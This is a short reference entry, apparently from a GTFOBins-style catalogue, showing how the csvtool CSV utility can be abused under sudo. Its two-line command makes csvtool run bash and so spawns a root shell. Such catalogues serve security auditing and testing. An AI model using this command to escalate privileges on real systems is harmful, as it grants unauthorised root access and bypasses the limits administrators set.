---
description: Handy command line tool for handling CSV files
functions:
  sudo:
      code: |
        echo "bash" > file.csv
        sudo csvtool call "bash -c" file.csv
---